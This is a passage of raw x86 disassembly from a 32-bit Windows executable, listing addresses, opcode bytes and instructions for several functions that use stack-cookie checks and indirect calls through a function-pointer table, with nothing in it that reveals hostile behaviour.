  4042fa:	8b 35 34 1c 44 00    	mov    0x441c34,%esi
  404300:	8b ce                	mov    %esi,%ecx
  404302:	6a 00                	push   $0x0
  404304:	ff 15 8c 61 42 00    	call   *0x42618c
  40430a:	ff d6                	call   *%esi
  40430c:	8b 35 a0 1c 44 00    	mov    0x441ca0,%esi
  404312:	83 c4 04             	add    $0x4,%esp
  404315:	8b ce                	mov    %esi,%ecx
  404317:	ff 15 8c 61 42 00    	call   *0x42618c
  40431d:	ff d6                	call   *%esi
  40431f:	85 c0                	test   %eax,%eax
  404321:	7f ce                	jg     0x4042f1
  404323:	55                   	push   %ebp
  404324:	e8 57 05 00 00       	call   0x404880
  404329:	8b 35 50 1c 44 00    	mov    0x441c50,%esi
  40432f:	83 c4 04             	add    $0x4,%esp
  404332:	8b ce                	mov    %esi,%ecx
  404334:	68 0c 1c 44 00       	push   $0x441c0c
  404339:	ff 15 8c 61 42 00    	call   *0x42618c
  40433f:	ff d6                	call   *%esi
  404341:	8b 35 4c 1c 44 00    	mov    0x441c4c,%esi
  404347:	83 c4 04             	add    $0x4,%esp
  40434a:	8b ce                	mov    %esi,%ecx
  40434c:	68 14 1c 44 00       	push   $0x441c14
  404351:	ff 15 8c 61 42 00    	call   *0x42618c
  404357:	ff d6                	call   *%esi
  404359:	8b 35 58 1c 44 00    	mov    0x441c58,%esi
  40435f:	83 c4 04             	add    $0x4,%esp
  404362:	8b ce                	mov    %esi,%ecx
  404364:	68 18 1c 44 00       	push   $0x441c18
  404369:	ff 15 8c 61 42 00    	call   *0x42618c
  40436f:	ff d6                	call   *%esi
  404371:	8b 35 50 1c 44 00    	mov    0x441c50,%esi
  404377:	83 c4 04             	add    $0x4,%esp
  40437a:	8b ce                	mov    %esi,%ecx
  40437c:	68 14 1c 44 00       	push   $0x441c14
  404381:	ff 15 8c 61 42 00    	call   *0x42618c
  404387:	ff d6                	call   *%esi
  404389:	8b 35 3c 1c 44 00    	mov    0x441c3c,%esi
  40438f:	83 c4 04             	add    $0x4,%esp
  404392:	8b ce                	mov    %esi,%ecx
  404394:	ff 15 8c 61 42 00    	call   *0x42618c
  40439a:	ff d6                	call   *%esi
  40439c:	8b 35 4c 1c 44 00    	mov    0x441c4c,%esi
  4043a2:	8b ce                	mov    %esi,%ecx
  4043a4:	68 20 1c 44 00       	push   $0x441c20
  4043a9:	ff 15 8c 61 42 00    	call   *0x42618c
  4043af:	ff d6                	call   *%esi
  4043b1:	8b 35 58 1c 44 00    	mov    0x441c58,%esi
  4043b7:	83 c4 04             	add    $0x4,%esp
  4043ba:	8b ce                	mov    %esi,%ecx
  4043bc:	68 1c 1c 44 00       	push   $0x441c1c
  4043c1:	ff 15 8c 61 42 00    	call   *0x42618c
  4043c7:	ff d6                	call   *%esi
  4043c9:	8b 35 50 1c 44 00    	mov    0x441c50,%esi
  4043cf:	83 c4 04             	add    $0x4,%esp
  4043d2:	8b ce                	mov    %esi,%ecx
  4043d4:	68 20 1c 44 00       	push   $0x441c20
  4043d9:	ff 15 8c 61 42 00    	call   *0x42618c
  4043df:	ff d6                	call   *%esi
  4043e1:	83 c4 04             	add    $0x4,%esp
  4043e4:	33 c0                	xor    %eax,%eax
  4043e6:	5f                   	pop    %edi
  4043e7:	5e                   	pop    %esi
  4043e8:	5d                   	pop    %ebp
  4043e9:	59                   	pop    %ecx
  4043ea:	c2 04 00             	ret    $0x4
  4043ed:	cc                   	int3
  4043ee:	cc                   	int3
  4043ef:	cc                   	int3
  4043f0:	33 c0                	xor    %eax,%eax
  4043f2:	c3                   	ret
  4043f3:	cc                   	int3
  4043f4:	cc                   	int3
  4043f5:	cc                   	int3
  4043f6:	cc                   	int3
  4043f7:	cc                   	int3
  4043f8:	cc                   	int3
  4043f9:	cc                   	int3
  4043fa:	cc                   	int3
  4043fb:	cc                   	int3
  4043fc:	cc                   	int3
  4043fd:	cc                   	int3
  4043fe:	cc                   	int3
  4043ff:	cc                   	int3
  404400:	c7 05 24 1c 44 00 01 	movl   $0x1,0x441c24
  404407:	00 00 00 
  40440a:	33 c0                	xor    %eax,%eax
  40440c:	c3                   	ret
  40440d:	cc                   	int3
  40440e:	cc                   	int3
  40440f:	cc                   	int3
  404410:	b8 04 10 00 00       	mov    $0x1004,%eax
  404415:	e8 06 54 00 00       	call   0x409820
  40441a:	a1 08 40 43 00       	mov    0x434008,%eax
  40441f:	33 c4                	xor    %esp,%eax
  404421:	89 84 24 00 10 00 00 	mov    %eax,0x1000(%esp)
  404428:	53                   	push   %ebx
  404429:	8b 9c 24 18 10 00 00 	mov    0x1018(%esp),%ebx
  404430:	55                   	push   %ebp
  404431:	8b ac 24 14 10 00 00 	mov    0x1014(%esp),%ebp
  404438:	56                   	push   %esi
  404439:	8b 35 74 1c 44 00    	mov    0x441c74,%esi
  40443f:	8b ce                	mov    %esi,%ecx
  404441:	57                   	push   %edi
  404442:	8b bc 24 18 10 00 00 	mov    0x1018(%esp),%edi
  404449:	6a 40                	push   $0x40
  40444b:	68 f8 7d 42 00       	push   $0x427df8
  404450:	ff 73 10             	push   0x10(%ebx)
  404453:	ff 15 8c 61 42 00    	call   *0x42618c
  404459:	ff d6                	call   *%esi
  40445b:	83 c4 04             	add    $0x4,%esp
  40445e:	50                   	push   %eax
  40445f:	e8 0c d7 00 00       	call   0x411b70
  404464:	83 c4 0c             	add    $0xc,%esp
  404467:	85 c0                	test   %eax,%eax
  404469:	75 61                	jne    0x4044cc
  40446b:	ff 73 10             	push   0x10(%ebx)
  40446e:	8b 35 74 1c 44 00    	mov    0x441c74,%esi
  404474:	81 c7 08 20 00 00    	add    $0x2008,%edi
  40447a:	8b ce                	mov    %esi,%ecx
  40447c:	ff 15 8c 61 42 00    	call   *0x42618c
  404482:	ff d6                	call   *%esi
  404484:	50                   	push   %eax
  404485:	8d 44 24 18          	lea    0x18(%esp),%eax
  404489:	57                   	push   %edi
  40448a:	50                   	push   %eax
  40448b:	e8 80 e7 ff ff       	call   0x402c10
  404490:	8b 35 6c 1c 44 00    	mov    0x441c6c,%esi
  404496:	83 c4 10             	add    $0x10,%esp
  404499:	8b ce                	mov    %esi,%ecx
  40449b:	6a 01                	push   $0x1
  40449d:	57                   	push   %edi
  40449e:	6a 00                	push   $0x0
  4044a0:	68 00 7e 42 00       	push   $0x427e00
  4044a5:	55                   	push   %ebp
  4044a6:	ff 15 8c 61 42 00    	call   *0x42618c
  4044ac:	ff d6                	call   *%esi
  4044ae:	8b 35 88 1c 44 00    	mov    0x441c88,%esi
  4044b4:	8d 44 24 24          	lea    0x24(%esp),%eax
  4044b8:	83 c4 14             	add    $0x14,%esp
  4044bb:	8b ce                	mov    %esi,%ecx
  4044bd:	50                   	push   %eax
  4044be:	55                   	push   %ebp
  4044bf:	ff 15 8c 61 42 00    	call   *0x42618c
  4044c5:	ff d6                	call   *%esi
  4044c7:	83 c4 08             	add    $0x8,%esp
  4044ca:	eb 05                	jmp    0x4044d1
  4044cc:	b8 01 00 00 00       	mov    $0x1,%eax
  4044d1:	8b 8c 24 10 10 00 00 	mov    0x1010(%esp),%ecx
  4044d8:	5f                   	pop    %edi
  4044d9:	5e                   	pop    %esi
  4044da:	5d                   	pop    %ebp
  4044db:	5b                   	pop    %ebx
  4044dc:	33 cc                	xor    %esp,%ecx
  4044de:	e8 24 53 00 00       	call   0x409807
  4044e3:	81 c4 04 10 00 00    	add    $0x1004,%esp
  4044e9:	c3                   	ret
  4044ea:	cc                   	int3
  4044eb:	cc                   	int3
  4044ec:	cc                   	int3
  4044ed:	cc                   	int3
  4044ee:	cc                   	int3
  4044ef:	cc                   	int3
  4044f0:	53                   	push   %ebx
  4044f1:	55                   	push   %ebp
  4044f2:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  4044f6:	56                   	push   %esi
  4044f7:	8b 35 74 1c 44 00    	mov    0x441c74,%esi
  4044fd:	8b ce                	mov    %esi,%ecx
  4044ff:	57                   	push   %edi
  404500:	8b 7c 24 20          	mov    0x20(%esp),%edi
  404504:	8d 1c ad 00 00 00 00 	lea    0x0(,%ebp,4),%ebx
  40450b:	ff 74 3b fc          	push   -0x4(%ebx,%edi,1)
  40450f:	ff 15 8c 61 42 00    	call   *0x42618c
  404515:	ff d6                	call   *%esi
  404517:	50                   	push   %eax
  404518:	e8 23 e6 ff ff       	call   0x402b40
  40451d:	83 c4 08             	add    $0x8,%esp
  404520:	85 c0                	test   %eax,%eax
  404522:	0f 84 85 00 00 00    	je     0x4045ad
  404528:	8b 35 94 1c 44 00    	mov    0x441c94,%esi
  40452e:	8b ce                	mov    %esi,%ecx
  404530:	53                   	push   %ebx
  404531:	ff 15 8c 61 42 00    	call   *0x42618c
  404537:	ff d6                	call   *%esi
  404539:	8b 35 78 1c 44 00    	mov    0x441c78,%esi
  40453f:	83 c4 04             	add    $0x4,%esp
  404542:	8b ce                	mov    %esi,%ecx
  404544:	8b d8                	mov    %eax,%ebx
  404546:	6a ff                	push   $0xffffffff
  404548:	68 0c 7e 42 00       	push   $0x427e0c
  40454d:	ff 15 8c 61 42 00    	call   *0x42618c
  404553:	ff d6                	call   *%esi
  404555:	83 c4 08             	add    $0x8,%esp
  404558:	89 03                	mov    %eax,(%ebx)
  40455a:	83 fd 01             	cmp    $0x1,%ebp
  40455d:	7e 16                	jle    0x404575
  40455f:	8d 4b 04             	lea    0x4(%ebx),%ecx
  404562:	2b fb                	sub    %ebx,%edi
  404564:	8d 55 ff             	lea    -0x1(%ebp),%edx
  404567:	8b 04 0f             	mov    (%edi,%ecx,1),%eax
  40456a:	8d 49 04             	lea    0x4(%ecx),%ecx
  40456d:	89 41 fc             	mov    %eax,-0x4(%ecx)
  404570:	83 ea 01             	sub    $0x1,%edx
  404573:	75 f2                	jne    0x404567
  404575:	8b 35 90 1c 44 00    	mov    0x441c90,%esi
  40457b:	8b ce                	mov    %esi,%ecx
  40457d:	6a 00                	push   $0x0
  40457f:	53                   	push   %ebx
  404580:	55                   	push   %ebp
  404581:	ff 74 24 24          	push   0x24(%esp)
  404585:	ff 15 8c 61 42 00    	call   *0x42618c
  40458b:	ff d6                	call   *%esi
  40458d:	8b 35 98 1c 44 00    	mov    0x441c98,%esi
  404593:	83 c4 10             	add    $0x10,%esp
  404596:	8b ce                	mov    %esi,%ecx
  404598:	8b f8                	mov    %eax,%edi
  40459a:	53                   	push   %ebx
  40459b:	ff 15 8c 61 42 00    	call   *0x42618c
  4045a1:	ff d6                	call   *%esi
  4045a3:	83 c4 04             	add    $0x4,%esp
  4045a6:	8b c7                	mov    %edi,%eax
  4045a8:	5f                   	pop    %edi
  4045a9:	5e                   	pop    %esi
  4045aa:	5d                   	pop    %ebp
  4045ab:	5b                   	pop    %ebx
  4045ac:	c3                   	ret
  4045ad:	5f                   	pop    %edi
  4045ae:	5e                   	pop    %esi
  4045af:	5d                   	pop    %ebp
  4045b0:	33 c0                	xor    %eax,%eax
  4045b2:	5b                   	pop    %ebx
  4045b3:	c3                   	ret
  4045b4:	cc                   	int3
  4045b5:	cc                   	int3
  4045b6:	cc                   	int3
  4045b7:	cc                   	int3
  4045b8:	cc                   	int3
  4045b9:	cc                   	int3
  4045ba:	cc                   	int3
  4045bb:	cc                   	int3
  4045bc:	cc                   	int3
  4045bd:	cc                   	int3
  4045be:	cc                   	int3
  4045bf:	cc                   	int3
  4045c0:	56                   	push   %esi
  4045c1:	8b 74 24 08          	mov    0x8(%esp),%esi
  4045c5:	8d 46 08             	lea    0x8(%esi),%eax
  4045c8:	c7 86 20 40 00 00 00 	movl   $0x0,0x4020(%esi)
  4045cf:	00 00 00 
  4045d2:	50                   	push   %eax
  4045d3:	e8 a8 19 00 00       	call   0x405f80
  4045d8:	89 86 24 40 00 00    	mov    %eax,0x4024(%esi)
  4045de:	8d 86 08 10 00 00    	lea    0x1008(%esi),%eax
  4045e4:	50                   	push   %eax
  4045e5:	e8 96 19 00 00       	call   0x405f80
  4045ea:	8b 8e 24 40 00 00    	mov    0x4024(%esi),%ecx
  4045f0:	83 c4 08             	add    $0x8,%esp
  4045f3:	89 86 28 40 00 00    	mov    %eax,0x4028(%esi)
  4045f9:	85 c9                	test   %ecx,%ecx
  4045fb:	74 20                	je     0x40461d
  4045fd:	85 c0                	test   %eax,%eax
  4045ff:	74 1c                	je     0x40461d
  404601:	50                   	push   %eax
  404602:	51                   	push   %ecx
  404603:	e8 68 08 00 00       	call   0x404e70
  404608:	83 c4 08             	add    $0x8,%esp
  40460b:	85 c0                	test   %eax,%eax
  40460d:	78 1b                	js     0x40462a
  40460f:	c7 86 20 40 00 00 01 	movl   $0x1,0x4020(%esi)
  404616:	00 00 00 
  404619:	33 c0                	xor    %eax,%eax
  40461b:	5e                   	pop    %esi
  40461c:	c3                   	ret
  40461d:	68 94 7d 42 00       	push   $0x427d94
  404622:	e8 29 d5 ff ff       	call   0x401b50
  404627:	83 c4 04             	add    $0x4,%esp
  40462a:	83 c8 ff             	or     $0xffffffff,%eax
  40462d:	5e                   	pop    %esi
  40462e:	c3                   	ret
  40462f:	cc                   	int3
  404630:	b8 20 20 00 00       	mov    $0x2020,%eax
  404635:	e8 e6 51 00 00       	call   0x409820
  40463a:	a1 08 40 43 00       	mov    0x434008,%eax
  40463f:	33 c4                	xor    %esp,%eax
  404641:	89 84 24 1c 20 00 00 	mov    %eax,0x201c(%esp)
  404648:	8b 84 24 24 20 00 00 	mov    0x2024(%esp),%eax
  40464f:	53                   	push   %ebx
  404650:	55                   	push   %ebp
  404651:	56                   	push   %esi
  404652:	57                   	push   %edi
  404653:	8b bc 24 38 20 00 00 	mov    0x2038(%esp),%edi
  40465a:	68 14 10 00 00       	push   $0x1014
  40465f:	6a 01                	push   $0x1
  404661:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  404665:	89 7c 24 2c          	mov    %edi,0x2c(%esp)
  404669:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%esp)
  404670:	00 
  404671:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
  404678:	00 
  404679:	e8 bf d4 00 00       	call   0x411b3d
  40467e:	33 ed                	xor    %ebp,%ebp
  404680:	83 c4 08             	add    $0x8,%esp
  404683:	8b d8                	mov    %eax,%ebx
  404685:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  404689:	39 af 1c 40 00 00    	cmp    %ebp,0x401c(%edi)
  40468f:	0f 86 2d 01 00 00    	jbe    0x4047c2
  404695:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  404699:	8d 87 08 30 00 00    	lea    0x3008(%edi),%eax
  40469f:	89 44 24 20          	mov    %eax,0x20(%esp)
  4046a3:	8b b7 18 40 00 00    	mov    0x4018(%edi),%esi
  4046a9:	03 f5                	add    %ebp,%esi
  4046ab:	56                   	push   %esi
  4046ac:	53                   	push   %ebx
  4046ad:	e8 6e cf ff ff       	call   0x401620
  4046b2:	8b d8                	mov    %eax,%ebx
  4046b4:	83 c4 08             	add    $0x8,%esp
  4046b7:	85 db                	test   %ebx,%ebx
  4046b9:	74 74                	je     0x40472f
  4046bb:	ff 33                	push   (%ebx)
  4046bd:	8b 7c 24 14          	mov    0x14(%esp),%edi
  4046c1:	53                   	push   %ebx
  4046c2:	57                   	push   %edi
  4046c3:	c7 44 24 24 01 00 00 	movl   $0x1,0x24(%esp)
  4046ca:	00 
  4046cb:	e8 b0 5d 00 00       	call   0x40a480
  4046d0:	8d 43 12             	lea    0x12(%ebx),%eax
  4046d3:	83 c7 12             	add    $0x12,%edi
  4046d6:	50                   	push   %eax
  4046d7:	ff 74 24 30          	push   0x30(%esp)
  4046db:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  4046df:	57                   	push   %edi
  4046e0:	e8 2b e5 ff ff       	call   0x402c10
  4046e5:	8d 4b 12             	lea    0x12(%ebx),%ecx
  4046e8:	83 c4 18             	add    $0x18,%esp
  4046eb:	8d 51 01             	lea    0x1(%ecx),%edx
  4046ee:	66 90                	xchg   %ax,%ax
  4046f0:	8a 01                	mov    (%ecx),%al
  4046f2:	41                   	inc    %ecx
  4046f3:	84 c0                	test   %al,%al
  4046f5:	75 f9                	jne    0x4046f0
  4046f7:	2b ca                	sub    %edx,%ecx
  4046f9:	8d 57 01             	lea    0x1(%edi),%edx
  4046fc:	0f 1f 40 00          	nopl   0x0(%eax)
  404700:	8a 07                	mov    (%edi),%al
  404702:	47                   	inc    %edi
  404703:	84 c0                	test   %al,%al
  404705:	75 f9                	jne    0x404700
  404707:	2b fa                	sub    %edx,%edi
  404709:	2b f9                	sub    %ecx,%edi
  40470b:	03 3b                	add    (%ebx),%edi
  40470d:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  404711:	53                   	push   %ebx
  404712:	89 3b                	mov    %edi,(%ebx)
  404714:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  404718:	53                   	push   %ebx
  404719:	e8 12 cd ff ff       	call   0x401430
  40471e:	83 c4 08             	add    $0x8,%esp
  404721:	85 c0                	test   %eax,%eax
  404723:	75 58                	jne    0x40477d
  404725:	8b 7c 24 24          	mov    0x24(%esp),%edi
  404729:	8b 54 24 18          	mov    0x18(%esp),%edx
  40472d:	eb 0c                	jmp    0x40473b
  40472f:	8b 54 24 18          	mov    0x18(%esp),%edx
  404733:	85 d2                	test   %edx,%edx
  404735:	75 68                	jne    0x40479f
  404737:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  40473b:	8d 4e 01             	lea    0x1(%esi),%ecx
  40473e:	66 90                	xchg   %ax,%ax
  404740:	8a 06                	mov    (%esi),%al
  404742:	46                   	inc    %esi
  404743:	84 c0                	test   %al,%al
  404745:	75 f9                	jne    0x404740
  404747:	2b f1                	sub    %ecx,%esi
  404749:	45                   	inc    %ebp
  40474a:	03 ee                	add    %esi,%ebp
  40474c:	3b af 1c 40 00 00    	cmp    0x401c(%edi),%ebp
  404752:	0f 82 4b ff ff ff    	jb     0x4046a3
  404758:	85 d2                	test   %edx,%edx
  40475a:	74 62                	je     0x4047be
  40475c:	8d 87 08 30 00 00    	lea    0x3008(%edi),%eax
  404762:	50                   	push   %eax
  404763:	8d 83 70 30 00 00    	lea    0x3070(%ebx),%eax
  404769:	50                   	push   %eax
  40476a:	8d 84 24 34 10 00 00 	lea    0x1034(%esp),%eax
  404771:	50                   	push   %eax
  404772:	e8 99 e4 ff ff       	call   0x402c10
  404777:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  40477b:	eb 61                	jmp    0x4047de
  40477d:	ff 74 24 28          	push   0x28(%esp)
  404781:	68 3c 7d 42 00       	push   $0x427d3c
  404786:	e8 c5 d3 ff ff       	call   0x401b50
  40478b:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  40478f:	83 c4 08             	add    $0x8,%esp
  404792:	c7 44 24 1c fe ff ff 	movl   $0xfffffffe,0x1c(%esp)
  404799:	ff 
  40479a:	e9 b8 00 00 00       	jmp    0x404857
  40479f:	56                   	push   %esi
  4047a0:	68 64 7d 42 00       	push   $0x427d64
  4047a5:	e8 a6 d3 ff ff       	call   0x401b50
  4047aa:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  4047ae:	83 c4 08             	add    $0x8,%esp
  4047b1:	c7 44 24 1c ff ff ff 	movl   $0xffffffff,0x1c(%esp)
  4047b8:	ff 
  4047b9:	e9 99 00 00 00       	jmp    0x404857
  4047be:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  4047c2:	8b 44 24 14          	mov    0x14(%esp),%eax
  4047c6:	05 70 20 00 00       	add    $0x2070,%eax
  4047cb:	68 00 10 00 00       	push   $0x1000
  4047d0:	50                   	push   %eax
  4047d1:	8d 84 24 34 10 00 00 	lea    0x1034(%esp),%eax
  4047d8:	50                   	push   %eax
  4047d9:	e8 22 ed 00 00       	call   0x413500
  4047de:	83 c4 0c             	add    $0xc,%esp
  4047e1:	8d 77 08             	lea    0x8(%edi),%esi
  4047e4:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  4047e8:	68 00 10 00 00       	push   $0x1000
  4047ed:	56                   	push   %esi
  4047ee:	50                   	push   %eax
  4047ef:	e8 0c ed 00 00       	call   0x413500
  4047f4:	8d 44 24 38          	lea    0x38(%esp),%eax
  4047f8:	50                   	push   %eax
  4047f9:	8d 84 24 3c 10 00 00 	lea    0x103c(%esp),%eax
  404800:	50                   	push   %eax
  404801:	56                   	push   %esi
  404802:	e8 09 e4 ff ff       	call   0x402c10
  404807:	68 00 10 00 00       	push   $0x1000
  40480c:	8d b7 08 10 00 00    	lea    0x1008(%edi),%esi
  404812:	8d 44 24 48          	lea    0x48(%esp),%eax
  404816:	56                   	push   %esi
  404817:	50                   	push   %eax
  404818:	e8 e3 ec 00 00       	call   0x413500
  40481d:	8d 44 24 50          	lea    0x50(%esp),%eax
  404821:	50                   	push   %eax
  404822:	8d 84 24 54 10 00 00 	lea    0x1054(%esp),%eax
  404829:	50                   	push   %eax
  40482a:	56                   	push   %esi
  40482b:	e8 e0 e3 ff ff       	call   0x402c10
  404830:	8d b7 08 20 00 00    	lea    0x2008(%edi),%esi
  404836:	8d 44 24 5c          	lea    0x5c(%esp),%eax
  40483a:	56                   	push   %esi
  40483b:	50                   	push   %eax
  40483c:	e8 7f e1 ff ff       	call   0x4029c0
  404841:	8d 44 24 64          	lea    0x64(%esp),%eax
  404845:	50                   	push   %eax
  404846:	8d 84 24 68 10 00 00 	lea    0x1068(%esp),%eax
  40484d:	50                   	push   %eax
  40484e:	56                   	push   %esi
  40484f:	e8 bc e3 ff ff       	call   0x402c10
  404854:	83 c4 44             	add    $0x44,%esp
  404857:	53                   	push   %ebx
  404858:	e8 eb d2 00 00       	call   0x411b48
  40485d:	8b 8c 24 30 20 00 00 	mov    0x2030(%esp),%ecx
  404864:	83 c4 04             	add    $0x4,%esp
  404867:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40486b:	5f                   	pop    %edi
  40486c:	5e                   	pop    %esi
  40486d:	5d                   	pop    %ebp
  40486e:	5b                   	pop    %ebx
  40486f:	33 cc                	xor    %esp,%ecx
  404871:	e8 91 4f 00 00       	call   0x409807
  404876:	81 c4 20 20 00 00    	add    $0x2020,%esp
  40487c:	c3                   	ret
  40487d:	cc                   	int3
  40487e:	cc                   	int3
  40487f:	cc                   	int3
  404880:	57                   	push   %edi
  404881:	8b 7c 24 08          	mov    0x8(%esp),%edi
  404885:	85 ff                	test   %edi,%edi
  404887:	0f 84 56 01 00 00    	je     0x4049e3
  40488d:	83 bf 20 40 00 00 01 	cmpl   $0x1,0x4020(%edi)
  404894:	74 42                	je     0x4048d8
  404896:	8b 87 24 40 00 00    	mov    0x4024(%edi),%eax
  40489c:	85 c0                	test   %eax,%eax
  40489e:	74 13                	je     0x4048b3
  4048a0:	50                   	push   %eax
  4048a1:	e8 ca 16 00 00       	call   0x405f70
  4048a6:	83 c4 04             	add    $0x4,%esp
  4048a9:	c7 87 24 40 00 00 00 	movl   $0x0,0x4024(%edi)
  4048b0:	00 00 00 
  4048b3:	8b 87 28 40 00 00    	mov    0x4028(%edi),%eax
  4048b9:	85 c0                	test   %eax,%eax
  4048bb:	0f 84 22 01 00 00    	je     0x4049e3
  4048c1:	50                   	push   %eax
  4048c2:	e8 a9 16 00 00       	call   0x405f70
  4048c7:	83 c4 04             	add    $0x4,%esp
  4048ca:	c7 87 28 40 00 00 00 	movl   $0x0,0x4028(%edi)
  4048d1:	00 00 00 
  4048d4:	33 c0                	xor    %eax,%eax
  4048d6:	5f                   	pop    %edi
  4048d7:	c3                   	ret
  4048d8:	56                   	push   %esi
  4048d9:	8b 35 48 1c 44 00    	mov    0x441c48,%esi
  4048df:	8b ce                	mov    %esi,%ecx
  4048e1:	ff 15 8c 61 42 00    	call   *0x42618c
  4048e7:	ff d6                	call   *%esi
  4048e9:	8b 0f                	mov    (%edi),%ecx
  4048eb:	39 47 04             	cmp    %eax,0x4(%edi)
  4048ee:	75 27                	jne    0x404917
  4048f0:	85 c9                	test   %ecx,%ecx
  4048f2:	0f 84 ea 00 00 00    	je     0x4049e2
  4048f8:	8b 35 40 1c 44 00    	mov    0x441c40,%esi
  4048fe:	51                   	push   %ecx
  4048ff:	8b ce                	mov    %esi,%ecx
  404901:	ff 15 8c 61 42 00    	call   *0x42618c
  404907:	ff d6                	call   *%esi
  404909:	83 c4 04             	add    $0x4,%esp
  40490c:	c7 07 00 00 00 00    	movl   $0x0,(%edi)
  404912:	33 c0                	xor    %eax,%eax
  404914:	5e                   	pop    %esi
  404915:	5f                   	pop    %edi
  404916:	c3                   	ret
  404917:	85 c9                	test   %ecx,%ecx
  404919:	74 7d                	je     0x404998
  40491b:	8b 35 4c 1c 44 00    	mov    0x441c4c,%esi
  404921:	8b ce                	mov    %esi,%ecx
  404923:	68 20 1c 44 00       	push   $0x441c20
  404928:	ff 15 8c 61 42 00    	call   *0x42618c
  40492e:	ff d6                	call   *%esi
  404930:	6a 00                	push   $0x0
  404932:	6a 00                	push   $0x0
  404934:	6a 01                	push   $0x1
  404936:	57                   	push   %edi
  404937:	c7 05 24 1c 44 00 01 	movl   $0x1,0x441c24
  40493e:	00 00 00 
  404941:	e8 aa 00 00 00       	call   0x4049f0
  404946:	8b 35 5c 1c 44 00    	mov    0x441c5c,%esi
  40494c:	83 c4 14             	add    $0x14,%esp
  40494f:	8b ce                	mov    %esi,%ecx
  404951:	6a 00                	push   $0x0
  404953:	68 20 1c 44 00       	push   $0x441c20
  404958:	68 1c 1c 44 00       	push   $0x441c1c
  40495d:	ff 15 8c 61 42 00    	call   *0x42618c
  404963:	ff d6                	call   *%esi
  404965:	8b 35 50 1c 44 00    	mov    0x441c50,%esi
  40496b:	83 c4 0c             	add    $0xc,%esp
  40496e:	8b ce                	mov    %esi,%ecx
  404970:	68 20 1c 44 00       	push   $0x441c20
  404975:	ff 15 8c 61 42 00    	call   *0x42618c
  40497b:	ff d6                	call   *%esi
  40497d:	8b 35 54 1c 44 00    	mov    0x441c54,%esi
  404983:	83 c4 04             	add    $0x4,%esp
  404986:	8b ce                	mov    %esi,%ecx
  404988:	68 1c 1c 44 00       	push   $0x441c1c
  40498d:	ff 15 8c 61 42 00    	call   *0x42618c
  404993:	ff d6                	call   *%esi
  404995:	83 c4 04             	add    $0x4,%esp
  404998:	8b 35 38 1c 44 00    	mov    0x441c38,%esi
  40499e:	8b ce                	mov    %esi,%ecx
  4049a0:	ff 15 8c 61 42 00    	call   *0x42618c
  4049a6:	ff d6                	call   *%esi
  4049a8:	8b 87 24 40 00 00    	mov    0x4024(%edi),%eax
  4049ae:	85 c0                	test   %eax,%eax
  4049b0:	74 13                	je     0x4049c5
  4049b2:	50                   	push   %eax
  4049b3:	e8 b8 15 00 00       	call   0x405f70
  4049b8:	83 c4 04             	add    $0x4,%esp
  4049bb:	c7 87 24 40 00 00 00 	movl   $0x0,0x4024(%edi)
  4049c2:	00 00 00 
  4049c5:	8b 87 28 40 00 00    	mov    0x4028(%edi),%eax
  4049cb:	85 c0                	test   %eax,%eax
  4049cd:	74 13                	je     0x4049e2
  4049cf:	50                   	push   %eax
  4049d0:	e8 9b 15 00 00       	call   0x405f70
  4049d5:	c7 87 28 40 00 00 00 	movl   $0x0,0x4028(%edi)
  4049dc:	00 00 00 
  4049df:	83 c4 04             	add    $0x4,%esp
  4049e2:	5e                   	pop    %esi
  4049e3:	33 c0                	xor    %eax,%eax
  4049e5:	5f                   	pop    %edi
  4049e6:	c3                   	ret
  4049e7:	cc                   	int3
  4049e8:	cc                   	int3
  4049e9:	cc                   	int3
  4049ea:	cc                   	int3
  4049eb:	cc                   	int3
  4049ec:	cc                   	int3
  4049ed:	cc                   	int3
  4049ee:	cc                   	int3
  4049ef:	cc                   	int3
  4049f0:	83 ec 08             	sub    $0x8,%esp
  4049f3:	53                   	push   %ebx
  4049f4:	55                   	push   %ebp
  4049f5:	56                   	push   %esi
  4049f6:	8b 35 94 1c 44 00    	mov    0x441c94,%esi
  4049fc:	8b ce                	mov    %esi,%ecx
  4049fe:	57                   	push   %edi
  4049ff:	6a 20                	push   $0x20
  404a01:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  404a08:	00 
  404a09:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  404a10:	00 
  404a11:	ff 15 8c 61 42 00    	call   *0x42618c
  404a17:	ff d6                	call   *%esi
  404a19:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  404a1d:	8b f8                	mov    %eax,%edi
  404a1f:	8b 6c 24 24          	mov    0x24(%esp),%ebp
  404a23:	8d 44 24 14          	lea    0x14(%esp),%eax
  404a27:	83 c4 04             	add    $0x4,%esp
  404a2a:	89 47 10             	mov    %eax,0x10(%edi)
  404a2d:	8d 44 24 14          	lea    0x14(%esp),%eax
  404a31:	89 47 14             	mov    %eax,0x14(%edi)
  404a34:	8b 44 24 28          	mov    0x28(%esp),%eax
  404a38:	89 47 18             	mov    %eax,0x18(%edi)
  404a3b:	8b 44 24 24          	mov    0x24(%esp),%eax
  404a3f:	c7 07 80 3f 40 00    	movl   $0x403f80,(%edi)
  404a45:	89 5f 08             	mov    %ebx,0x8(%edi)
  404a48:	89 6f 0c             	mov    %ebp,0xc(%edi)
  404a4b:	89 47 1c             	mov    %eax,0x1c(%edi)
  404a4e:	8b 35 4c 1c 44 00    	mov    0x441c4c,%esi
  404a54:	8b ce                	mov    %esi,%ecx
  404a56:	68 10 1c 44 00       	push   $0x441c10
  404a5b:	ff 15 8c 61 42 00    	call   *0x42618c
  404a61:	ff d6                	call   *%esi
  404a63:	8b 35 60 1c 44 00    	mov    0x441c60,%esi
  404a69:	83 c4 04             	add    $0x4,%esp
  404a6c:	8b ce                	mov    %esi,%ecx
  404a6e:	6a 00                	push   $0x0
  404a70:	57                   	push   %edi
